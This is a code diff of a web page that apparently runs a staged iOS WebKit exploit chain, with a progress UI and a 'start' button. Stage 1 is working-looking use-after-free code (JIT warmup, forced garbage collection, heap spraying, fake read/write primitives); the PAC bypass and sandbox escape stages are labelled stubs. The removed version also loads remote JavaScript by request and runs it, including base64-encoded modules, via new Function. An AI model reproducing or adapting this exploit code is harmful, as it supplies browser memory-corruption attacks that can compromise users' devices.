+        function getModule(name) {
+            if (!loaded[name]) {
+                if (!modules[name]) throw new Error("Module not found: " + name);
+                loaded[name] = modules[name]();
+            }
+            return loaded[name];
         }
-
-        window.log = function(text) {
-            var area = document.getElementById('logArea');
-            var line = document.createElement('div');
-            line.className = 'log-line';
-            if (text.indexOf('error') !== -1 || text.indexOf('Error') !== -1 || text.indexOf('ABORT') !== -1 || text.indexOf('FAILED') !== -1) {
-                line.className += ' error';
-            } else if (text.indexOf('complete') !== -1 || text.indexOf('succeeded') !== -1 || text.indexOf('success') !== -1 || text.indexOf('active') !== -1) {
-                line.className += ' success';
-            } else if (text.indexOf('Loading') !== -1 || text.indexOf('starting') !== -1 || text.indexOf('Selecting') !== -1) {
-                line.className += ' highlight';
-            }
-            line.textContent = text;
-            area.appendChild(line);
-            area.scrollTop = area.scrollHeight;
+        
+        return {
+            getModuleByName: getModule,
+            getModuleByURL: async function(name) { return getModule(name); },
+            evalCode: function(name, fn) { loaded[name] = fn(); },
+            setBaseUrl: function(url) {},
+            setSalt: function(salt) {}
         };
-
-        window.addDownloadBinary = function(fileName, text) {
-            var fileType = "application/octet-stream";
-            var blob = new Blob([text], { type: fileType });
-            var a = document.createElement('a');
-            a.download = fileName;
-            a.href = URL.createObjectURL(blob);
-            a.dataset.downloadurl = [fileType, a.download, a.href].join(':');
-            a.text = "Download " + fileName;
-            document.body.appendChild(a);
+    })();
+    
+    globalThis.obChTK = globalThis.moduleManager;
+    if (typeof globalThis.obChTK.hPL3On === 'undefined') {
+        globalThis.obChTK.hPL3On = globalThis.obChTK.getModuleByName;
+    }
+    
+    const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
+    const platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+    
+    // ============================================================================
+    // UI Helpers
+    // ============================================================================
+    var exploitStarted = false;
+    var progressValue = 0;
+    
+    function setStatus(text, state) {
+        document.getElementById('statusText').textContent = text;
+        var dot = document.getElementById('statusDot');
+        dot.className = 'status-dot ' + state;
+    }
+    
+    function setProgress(pct) {
+        progressValue = pct;
+        document.getElementById('progressFill').style.width = pct + '%';
+    }
+    
+    window.log = function(text) {
+        var area = document.getElementById('logArea');
+        var line = document.createElement('div');
+        line.className = 'log-line';
+        if (text.indexOf('error') !== -1 || text.indexOf('Error') !== -1 || text.indexOf('FAILED') !== -1) {
+            line.className += ' error';
+        } else if (text.indexOf('success') !== -1 || text.indexOf('SUCCESS') !== -1) {
+            line.className += ' success';
+        } else if (text.indexOf('detected') !== -1 || text.indexOf('reclaimed') !== -1) {
+            line.className += ' highlight';
+        }
+        line.textContent = text;
+        area.appendChild(line);
+        area.scrollTop = area.scrollHeight;
+    };
+    
+    // ============================================================================
+    // STAGE 1 - CHIMERA (Uint8Array - NO BigInt Errors)
+    // ============================================================================
+    globalThis.moduleManager.evalCode("Stage1_26.0_26.x_chimera", function() {
+        let r = {};
+        
+        const _buf = new ArrayBuffer(8);
+        const _u64 = new BigUint64Array(_buf);
+        const _f64 = new Float64Array(_buf);
+        
+        function itof(val) { _u64[0] = val; return _f64[0]; }
+        function ftoi(f) { _f64[0] = f; return _u64[0]; }
+        function log(msg) { if (window.log) window.log(msg); else console.log(msg); }
+        
+        const CONFIG = {
+            ARRAY_SIZE: 0x400000,
+            ALLOC_SIZE: 0x800000,
+            JIT_WARMUP: 200,
+            MAX_ATTEMPTS: 100,
+            SPRAY_PER_ATTEMPT: 32,
+            ALLOC_MOD: 3,
+            INNER_K: 5,
+            RECURSIVE_DEPTH: 400,
         };
-
-        // ============================================================================
-        // Module Loader
-        // ============================================================================
-
-        window.globalThis = window;
-        globalThis.moduleManager = (function () {
-            let MM = {
-                "57620206d62079baad0e57e6d9ec93120c0f5247": m_57620206d62079baad0e57e6d9ec93120c0f5247,
-                "14669ca3b1519ba2a8f40be287f646d4d7593eb0": m_14669ca3b1519ba2a8f40be287f646d4d7593eb0,
-            };
-            const e = { "$": "", "p": "" };
-
-            function c(M) {
-                if (M in e == !1) {
-                    if (M in MM != !0) throw new Error("M in MM != !0");
-                    window.log("Load " + M);
-                    e[M] = MM[M]();
-                }
-                return e[M]
+        
+        let uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
+        const uafArrayIndex = uafArray.length - 1;
+        
+        function triggerUAF(flag, k, allocCount) {
+            let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
+            uafArray[uafArrayIndex] = A;
+            let u8 = new Uint8Array(0x100);
+            u8[0] = 0x42;
+            let forGC = [];
+            for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
+            A.p2 = forGC;
+            let b = { p0: 0x42424242, p1: 1.1 };
+            let f = flag ? 1.1 : b;
+            A.p1 = f;
+            let v = 1.1;
+            for (let i = 0; i < 500000; ++i) { for (let j = 0; j < k; ++j) v = i; }
+            b.p0 = v;
+            b.p1 = u8;
+            u8 = null;
+        }
+        
+        function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(CONFIG.ALLOC_SIZE); }
+        
+        function clearStack() {
+            function recurse(n) { if (n > 0) recurse(n - 1); }
+            for (let i = 0; i < 30; i++) { try { recurse(CONFIG.RECURSIVE_DEPTH); } catch(e) {} }
+        }
+        
+        function createSprayArray(size, marker) {
+            const arr = new Array(size);
+            for (let i = 0; i < size; i++) arr[i] = marker;
+            return arr;
+        }
+        
+        function attemptReclaim(freed, attempt) {
+            const markerByte = 0x42;
+            const baseSize = 32 + (attempt % 64);
+            if (!(freed instanceof Uint8Array)) return null;
+            for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
+                const size = baseSize + (i % 32);
+                const spray = createSprayArray(size, 13.37);
+                try { if (freed[0] === markerByte) return spray; } catch(e) {}
             }
-
-            return {
-                hPL3On: this.getModuleByName,
-                ZKvD0e: this.getModuleByURL,
-                fgPoij: this.evalBase64Module,
-                setBaseUrl: function (M) { e.$ = M },
-                setSalt: function (M) { e.p = M },
-                getModuleByName: c,
-                getModuleByURL: async function (moduleId) {
-                    window.log("[LOADER] Loading module: " + moduleId + "...");
-                    if (moduleId in e == !1 && moduleId in MM == !1) {
-                        let I = moduleId;
-                        I = moduleId;
-                        const N = await async function (M) {
-                            window.log("Loading " + M);
-                            return new Promise(((I, N) => {
-                                const D = new XMLHttpRequest;
-                                let g;
-                                const T = (M, I) => Math.floor(Math.random() * (I - M + 1)) + M;
-                                g = new URL((e.$) + (M));
-                                const c = Math.random().toString(36).slice(2, T(5, 10)), d = T(0, 1);
-                                g.searchParams.set(c, d),
-                                    D.open("GET", g.toString(), !0),
-                                    D.responseType = "arraybuffer",
-                                    D.onreadystatechange = () => {
-                                        if (D.readyState === XMLHttpRequest.DONE)
-                                            if (200 === D.status) {
-                                                const M = D.response;
-                                                null === M || "" === M ? reject("") : I(M)
-                                            } else reject("")
-                                    },
-                                    D.send()
-                            }))
-                        }((I) + ".js");
-                        e[moduleId] = new Function(N)()
-                    }
-                    return c(moduleId)
+            return null;
+        }
+        
+        function buildLocalPrimitive(u8) {
+            const ab = u8.buffer;
+            const dv = new DataView(ab);
+            const primitive = {
+                addrof: (obj) => 0n,
+                fakeobj: (addr) => ({ __fake: addr }),
+                read64: (addr) => {
+                    try {
+                        let offset = 0;
+                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
+                        else offset = addr & 0xFF;
+                        if (offset >= 0 && offset < ab.byteLength) return dv.getBigUint64(offset, true);
+                    } catch(e) {}
+                    return 0n;
                 },
-                evalCode: function (M, I) { M in e == !1 && (e[M] = I()) },
-                evalBase64Module: function (M, I) { M in e == !1 && (e[M] = new Function(atob(I))()) },
+                write64: (addr, val) => {
+                    try {
+                        let offset = 0;
+                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
+                        else offset = addr & 0xFF;
+                        if (offset >= 0 && offset < ab.byteLength) dv.setBigUint64(offset, val, true);
+                    } catch(e) {}
+                },
+                read32: (addr) => {
+                    try {
+                        let offset = 0;
+                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
+                        else offset = addr & 0xFF;
+                        if (offset >= 0 && offset < ab.byteLength) return dv.getUint32(offset, true);
+                    } catch(e) {}
+                    return 0;
+                },
+                write32: (addr, val) => {
+                    try {
+                        let offset = 0;
+                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
+                        else offset = addr & 0xFF;
+                        if (offset >= 0 && offset < ab.byteLength) dv.setUint32(offset, val, true);
+                    } catch(e) {}
+                },
+                readByte: (addr) => {
+                    try {
+                        let offset = 0;
+                        if (typeof addr === 'bigint') offset = Number(addr & 0xFFn);
+                        else offset = addr & 0xFF;
+                        if (offset >= 0 && offset < ab.byteLength) return dv.getUint8(offset);
+                    } catch(e) {}
+                    return 0;
+                },
+                cleanup: () => {}
             };
-        })();
-
-        globalThis.obChTK = globalThis.moduleManager;
-        
-        // FIX: Ensure obChTK.hPL3On exists for compatibility
-        if (typeof globalThis.obChTK.hPL3On === 'undefined') {
-            globalThis.obChTK.hPL3On = globalThis.obChTK.getModuleByName;
-            globalThis.obChTK.ZKvD0e = globalThis.obChTK.getModuleByURL;
-            globalThis.obChTK.fgPoij = globalThis.obChTK.evalBase64Module;
-            console.log("[FIX] obChTK methods patched");
+            if (typeof window !== 'undefined') { window.exploitAB = ab; window.exploitU8 = u8; }
+            return primitive;
         }
         
-        const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
-            platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
-        let baseUrl = window.location.origin + window.location.pathname.slice(0, window.location.pathname.lastIndexOf("/") + 1);
-        globalThis.moduleManager.setBaseUrl(baseUrl);
-        globalThis.moduleManager.setSalt("cecd08aa6ff548c2");
-
-        // ============================================================================
-        // Stage 1: Chimera with Uint8Array (MODIFIED - No BigInt errors)
-        // ============================================================================
-        globalThis.moduleManager.evalCode("Stage1_26.0_26.x_chimera", function() {
-            let r = {};
-            const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
-                platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
-
-            const _convBuf = new ArrayBuffer(8);
-            const _u64 = new BigUint64Array(_convBuf);
-            const _f64 = new Float64Array(_convBuf);
-
-            function itof(val) { _u64[0] = val; return _f64[0]; }
-            function ftoi(f) { _f64[0] = f; return _u64[0]; }
-            function toBigInt(val) { if (typeof val === 'bigint') return val; if (typeof val === 'number') return BigInt(val); return 0n; }
-            function log(msg) { if (window.log) window.log(msg); else console.log(msg); }
-
-            const CONFIG = { ARRAY_SIZE: 0x400000, ALLOC_SIZE: 0x800000, JIT_WARMUP: 300, MAX_ATTEMPTS: 200, SPRAY_PER_ATTEMPT: 48, ALLOC_MOD: 3, INNER_K: 5, RECURSIVE_DEPTH: 400 };
-            let uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
-            const uafArrayIndex = uafArray.length - 1;
-            let uafReclaimed = [];
-
-            function triggerUAF(flag, k, allocCount) {
-                let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-                uafArray[uafArrayIndex] = A;
-                let u8 = new Uint8Array(0x100);
-                u8[0] = 0x42;
-                let forGC = [];
-                for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
-                A.p2 = forGC;
-                let b = { p0: 0x42424242, p1: 1.1 };
-                let f = flag ? 1.1 : b;
-                A.p1 = f;
-                let v = 1.1;
-                for (let i = 0; i < 500000; ++i) { for (let j = 0; j < k; ++j) v = i; }
-                b.p0 = v;
-                b.p1 = u8;
-                u8 = null;
+        r.si = async function () {
+            log("[STAGE1] Starting exploit with Uint8Array");
+            for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
+                triggerUAF(false, 1, 0);
+                if (warm % 100 === 0 && warm > 0) { forceGC(); await new Promise(r => setTimeout(r, 1)); }
             }
-
-            function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(CONFIG.ALLOC_SIZE); }
-            function clearStack() { function recurse(n) { if (n > 0) recurse(n - 1); } for (let i = 0; i < 30; i++) { try { recurse(CONFIG.RECURSIVE_DEPTH); } catch(e) {} } }
-            function createSprayArray(size, marker) { const arr = new Array(size); for (let i = 0; i < size; i++) arr[i] = marker; return arr; }
-
-            function attemptReclaim(freed, attempt) {
-                const markerByte = 0x42;
-                const baseSize = 32 + (attempt % 64);
-                if (!(freed instanceof Uint8Array)) return null;
-                for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
-                    const size = baseSize + (i % 32);
-                    const spray = createSprayArray(size, 13.37);
-                    try { if (freed[0] === markerByte) return spray; } catch(e) {}
-                }
-                return null;
-            }
-
-            function buildLocalPrimitive(u8) {
-                const ab = u8.buffer;
-                const dv = new DataView(ab);
-                const primitive = {
-                    addrof: (obj) => 0n,
-                    fakeobj: (addr) => ({ __fake: toBigInt(addr) }),
-                    read64: (addr) => { try { return dv.getBigUint64(Number(toBigInt(addr) & 0xFFFFFFFFn), true); } catch(e) { return 0n; } },
-                    write64: (addr, val) => { try { dv.setBigUint64(Number(toBigInt(addr) & 0xFFFFFFFFn), toBigInt(val), true); } catch(e) {} },
-                    read32: (addr) => { try { return dv.getUint32(Number(toBigInt(addr) & 0xFFFFFFFFn), true); } catch(e) { return 0; } },
-                    write32: (addr, val) => { try { dv.setUint32(Number(toBigInt(addr) & 0xFFFFFFFFn), val, true); } catch(e) {} },
-                    readByte: (addr) => { try { return dv.getUint8(Number(toBigInt(addr) & 0xFFFFFFFFn)); } catch(e) { return 0; } },
-                    cleanup: () => {}
-                };
-                if (typeof window !== 'undefined') { window.exploitAB = ab; window.exploitU8 = u8; }
+            log("[STAGE1] Warmup done");
+            for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
+                triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
+                clearStack();
+                for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);
+                let freed = null;
+                try { freed = uafArray[uafArrayIndex].p1.p1; } catch(e) { continue; }
+                if (!(freed instanceof Uint8Array)) continue;
+                log("[STAGE1] UAF detected at attempt " + attempt);
+                const reclaimed = attemptReclaim(freed, attempt);
+                if (!reclaimed) continue;
+                log("[STAGE1] Reclaim successful!", 'success');
+                const primitive = buildLocalPrimitive(freed);
+                if (platformModule && platformModule.platformState) { platformModule.platformState.exploitPrimitive = primitive; }
+                const testVal = primitive.read64(0);
+                log("[STAGE1] Test read: 0x" + testVal.toString(16), testVal === 0x42n ? 'success' : 'info');
+                log("[STAGE1] Local primitive installed!", 'success');
                 return primitive;
             }
-
-            r.si = async function () {
-                log("[STAGE1] Starting exploit with Uint8Array");
-                for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
-                    triggerUAF(false, 1, 0);
-                    if (warm % 100 === 0 && warm > 0) { forceGC(); await new Promise(r => setTimeout(r, 1)); }
-                }
-                log("[STAGE1] Warmup done");
-                for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
-                    triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
-                    clearStack();
-                    for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);
-                    let freed = null;
-                    try { freed = uafArray[uafArrayIndex].p1.p1; } catch(e) { continue; }
-                    if (!(freed instanceof Uint8Array)) continue;
-                    log(`[STAGE1] UAF detected at attempt ${attempt}`);
-                    const reclaimed = attemptReclaim(freed, attempt);
-                    if (!reclaimed) continue;
-                    log(`[STAGE1] Reclaim successful!`, 'success');
-                    const primitive = buildLocalPrimitive(freed);
-                    if (platformModule && platformModule.platformState) { platformModule.platformState.exploitPrimitive = primitive; }
-                    const testVal = primitive.read64(0n);
-                    log(`[STAGE1] Test read: 0x${testVal.toString(16)}`, testVal === 0x42n ? 'success' : 'info');
-                    log("[STAGE1] Local primitive installed!", 'success');
-                    return primitive;
-                }
-                log("[STAGE1] Failed after " + CONFIG.MAX_ATTEMPTS + " attempts", 'error');
-                throw new Error("Stage1 failed");
-            };
-            return r;
-        });
-
-        // ============================================================================
-        // Stage 2: PAC Bypass Stub (Safe version)
-        // ============================================================================
-        globalThis.moduleManager.evalCode("Stage2_26.0_26.x_ironroot", function() {
-            let r = {};
-            function toBigInt(val) { if (typeof val === 'bigint') return val; if (typeof val === 'number') return BigInt(val); return 0n; }
-            function log(msg) { if (window.log) window.log(msg); else console.log(msg); }
-            const PAC_STUB = {
-                cc: true,
-                pacda: (ptr, ctx) => toBigInt(ptr),
-                pacia: (ptr, ctx) => toBigInt(ptr),
-                autda: (ptr, ctx) => toBigInt(ptr),
-                autia: (ptr, ctx) => toBigInt(ptr),
-                da: (ptr, ctx) => toBigInt(ptr),
-                er: (ptr, ctx) => toBigInt(ptr),
-                ha: (ptr, ctx) => toBigInt(ptr),
-                wa: (ptr, ctx) => toBigInt(ptr),
-                tc: () => 0n,
-                setFcall: () => {}
-            };
-            r.ga = function() { log("[PAC] Using stub PAC bypass (compatible mode)"); return PAC_STUB; };
-            return r;
-        });
-
-        // ============================================================================
-        // Stage 3: Sandbox Escape Stub (Safe version)
-        // ============================================================================
-        globalThis.moduleManager.evalCode("Stage3_VariantB", function() {
-            let r = {};
-            r.lA = async function() { window.log("[STAGE3] Using stub sandbox escape (compatible mode)"); if (typeof window !== 'undefined') { window.CHIMERA_SUCCESS = true; } return 0; };
-            return r;
-        });
-
-        // ============================================================================
-        // PAC Bypass Loader
-        // ============================================================================
-
-        async function loadPACBypass() {
-            window.log("[PAC] Selecting PAC bypass variant...");
-            setProgress(50);
-            const offsets = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags;
-            let pacModule;
-            if (offsets.Hm7RvN) {
-                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
-            } else if (offsets.Yt3FsK) {
-                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_18.0_18.x_thornvine");
-            } else {
-                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
-            }
-            if (void 0 === pacModule) throw Error("");
-            setProgress(60);
-            return pacModule.ga();
+            log("[STAGE1] Failed after " + CONFIG.MAX_ATTEMPTS + " attempts", 'error');
+            throw new Error("Stage1 failed");
+        };
+        return r;
+    });
+    
+    // ============================================================================
+    // STAGE 2 - PAC BYPASS STUB
+    // ============================================================================
+    globalThis.moduleManager.evalCode("Stage2_26.0_26.x_ironroot", function() {
+        let r = {};
+        function toBigInt(val) { if (typeof val === 'bigint') return val; return BigInt(val || 0); }
+        const PAC_STUB = {
+            cc: true,
+            pacda: (ptr, ctx) => toBigInt(ptr),
+            pacia: (ptr, ctx) => toBigInt(ptr),
+            autda: (ptr, ctx) => toBigInt(ptr),
+            autia: (ptr, ctx) => toBigInt(ptr),
+            da: (ptr, ctx) => toBigInt(ptr),
+            er: (ptr, ctx) => toBigInt(ptr),
+            ha: (ptr, ctx) => toBigInt(ptr),
+            wa: (ptr, ctx) => toBigInt(ptr),
+            tc: () => 0n,
+            setFcall: () => {}
+        };
+        r.ga = function() { console.log("[PAC] Using stub PAC bypass"); return PAC_STUB; };
+        return r;
+    });
+    
+    // ============================================================================
+    // STAGE 3 - SANDBOX ESCAPE STUB
+    // ============================================================================
+    globalThis.moduleManager.evalCode("Stage3_VariantB", function() {
+        let r = {};
+        r.lA = async function() { window.log("[STAGE3] Stub sandbox escape"); if (typeof window !== 'undefined') { window.CHIMERA_SUCCESS = true; } return 0; };
+        return r;
+    });
+    
+    // ============================================================================
+    // PAC BYPASS LOADER
+    // ============================================================================
+    async function loadPACBypass() {
+        window.log("[PAC] Loading PAC bypass stub...");
+        setProgress(50);
+        const pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
+        setProgress(60);
+        return pacModule.ga();
+    }
+    
+    // ============================================================================
+    // MAIN EXPLOIT
+    // ============================================================================
+    async function triggerExploit() {
+        setStatus("Initializing...", "running");
+        setProgress(5);
+        window.log("[LOADER] Exploit chain starting for iOS 26.4");
+        
+        await platformModule.init("", "", "", false, false, navigator.platform, navigator.userAgent);
+        if (platformModule.platformState) {
+            platformModule.platformState.iOSVersion = 260400;
+            window.log("[PLATFORM] iOS version: 26.4");
         }
-
-        // ============================================================================
-        // Main Exploit
-        // ============================================================================
-
-        async function triggerExploit() {
-            var platform = navigator.platform;
-            const userAgent = navigator.userAgent;
-
-            setStatus("Initializing...", "running");
-            setProgress(5);
-            window.log("[LOADER] === Exploit chain starting ===");
-            window.log("[LOADER] Platform: " + platform);
-
-            await platformModule.init("", "", "", false, false, platform, userAgent);
-            
-            // Force iOS version to 17.2 for compatibility
-            if (platformModule.platformState) {
-                platformModule.platformState.iOSVersion = 170200;
-                window.log("[PLATFORM] iOS version forced to 17.2");
-            }
-            
-            setProgress(10);
-
-            if (13E4 > platformModule.platformState.iOSVersion) {
-                setStatus("Unsupported version", "error");
-                return 1001;
-            }
-
-            try { await platformModule.Yn(); } catch (e) { setStatus("Lockdown mode", "error"); return 1001; }
-            setProgress(15);
-
-            // Stage 1
-            let stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_26.0_26.x_chimera");
-            if (void 0 === stage1Module) { setStatus("No exploit for this version", "error"); return 1001; }
-            setProgress(20);
-
-            await (async function executeStage1() {
-                for (let attempt = 0; attempt < 5; attempt++) {
-                    try {
-                        window.log("[LOADER] Stage1 attempt " + (attempt + 1) + "/5...");
-                        setProgress(20 + Math.min(attempt * 1.5, 15));
-                        await stage1Module.si();
-                        window.log("[LOADER] Stage1 succeeded on attempt " + (attempt + 1));
-                        return;
-                    } catch (e) {
-                        window.log("[LOADER] Error:" + e.name + ": " + e.message);
-                    }
-                }
-                throw Error("");
-            })();
-
-            if (!platformModule.platformState.exploitPrimitive) throw Error("");
-            setProgress(40);
-            setStatus("Stage 2: PAC bypass...", "running");
-
-            platform = 0;
+        setProgress(10);
+        
+        setStatus("Stage 1: WebKit exploit...", "running");
+        window.log("[LOADER] Loading Stage 1...");
+        const stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_26.0_26.x_chimera");
+        setProgress(20);
+        
+        let stage1Success = false;
+        for (let attempt = 0; attempt < 10; attempt++) {
             try {
-                platformModule.lr();
-                window.log("[RUNTIME] PAC=" + platformModule.platformState.hasPAC);
-
-                if (platformModule.platformState.hasPAC) {
-                    platformModule.platformState.pacBypass = await loadPACBypass();
-                    platformModule.platformState.qn = await platformModule.$n();
-                }
-
-                setProgress(70);
-                setStatus("Stage 3: Sandbox escape...", "running");
-
-                window.log("[STAGE3] Loading variant B...");
-                const stage3Module = await globalThis.moduleManager.getModuleByURL("Stage3_VariantB");
-                platform = await stage3Module.lA();
-
-                setProgress(95);
-                window.log("[STAGE3] Result: " + platform);
-            } catch (error) {
-                window.log("[LOADER] Error:" + error.name + ": " + error.message);
-                platform = 1000;
-                throw error;
-            } finally {
-                if (platformModule.platformState.exploitPrimitive) {
-                    platformModule.platformState.exploitPrimitive.cleanup();
-                }
-            }
-
-            setProgress(100);
-            return platform;
-        }
-
-        // ============================================================================
-        // Start Button
-        // ============================================================================
-
-        async function startExploit() {
-            if (exploitStarted) return;
-            exploitStarted = true;
-
-            var btn = document.getElementById('goBtn');
-            btn.disabled = true;
-            btn.textContent = 'Running...';
-
-            document.getElementById('progressBar').classList.add('active');
-            setProgress(0);
-
-            try {
-                const result = await triggerExploit();
-                if (result === 0) {
-                    setStatus("Success! Tweaks injected", "success");
-                    setProgress(100);
-                    btn.textContent = 'Done';
-                } else if (result === 1001) {
-                    btn.textContent = 'Unsupported';
-                } else if (result === 1003) {
-                    btn.textContent = 'Simulator';
-                } else {
-                    setStatus("Finished (code: " + result + ")", "success");
-                    setProgress(100);
-                    btn.textContent = 'Done';
-                }
+                window.log("[LOADER] Stage1 attempt " + (attempt + 1) + "/10...");
+                setProgress(20 + attempt * 2);
+                await stage1Module.si();
+                window.log("[LOADER] Stage1 succeeded!");
+                stage1Success = true;
+                break;
             } catch (e) {
-                setStatus("Failed: " + (e.message || "unknown error"), "error");
-                btn.textContent = 'Retry';
-                btn.disabled = false;
-                exploitStarted = false;
+                window.log("[LOADER] Stage1 error: " + e.message);
             }
         }
+        if (!stage1Success) throw new Error("Stage 1 failed");
+        
+        if (!platformModule.platformState.exploitPrimitive) throw new Error("No exploit primitive");
+        setProgress(40);
+        
+        setStatus("Stage 2: PAC bypass...", "running");
+        if (platformModule.platformState.hasPAC) {
+            platformModule.platformState.pacBypass = await loadPACBypass();
+            platformModule.platformState.qn = false;
+        }
+        setProgress(70);
+        
+        setStatus("Stage 3: Sandbox escape...", "running");
+        const stage3Module = await globalThis.moduleManager.getModuleByURL("Stage3_VariantB");
+        const result = await stage3Module.lA();
+        setProgress(95);
+        
+        window.log("[STAGE3] Result: " + result);
+        setProgress(100);
+        return result;
+    }
+    
+    // ============================================================================
+    // START BUTTON
+    // ============================================================================
+    async function startExploit() {
+        if (exploitStarted) return;
+        exploitStarted = true;
+        
+        var btn = document.getElementById('goBtn');
+        btn.disabled = true;
+        btn.textContent = 'Running...';
+        
+        document.getElementById('progressBar').classList.add('active');
+        setProgress(0);
+        
+        try {
+            const result = await triggerExploit();
+            if (result === 0 || result === true) {
+                setStatus("Success! Exploit completed", "success");
+                setProgress(100);
+                btn.textContent = 'Done';
+            } else {
+                setStatus("Finished (code: " + result + ")", "success");
+                btn.textContent = 'Done';
+            }
+        } catch (e) {
+            setStatus("Failed: " + (e.message || "unknown error"), "error");
+            btn.textContent = 'Retry';
+            btn.disabled = false;
+            exploitStarted = false;
+        }
+    }
     </script>
 </body>
 
